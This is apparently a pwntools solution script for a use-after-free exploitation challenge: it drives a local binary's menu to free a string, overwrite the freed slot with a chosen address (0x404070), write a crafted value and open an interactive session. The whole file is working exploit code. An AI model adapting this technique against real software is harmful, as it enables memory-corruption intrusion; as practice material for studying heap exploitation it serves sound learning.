from pwn import *

p = process("./use_after_free")
# gdb.attach(p)

def setString(data):
    # menu
    p.recvuntil(b"> ")
    p.send(b"1\n")
    p.recvuntil(b"> ")
    p.sendline(data)

def delString():
    # menu
    p.recvuntil(b"> ")
    p.sendline(b"3\n")

def setNum(data):
    # menu
    p.recvuntil(b"> ")
    p.sendline(b"4")
    p.recvuntil(b"> ")
    p.sendline(data)

def getString():
    p.recvuntil(b"> ")
    p.sendline(b"2")

setString(b"AAAAA")
delString()
setNum(b"4210800") #its converted to 0x404070 
setString(b"\x37\x13\x03\x00\x00\x00\x00\x00")
p.interactive()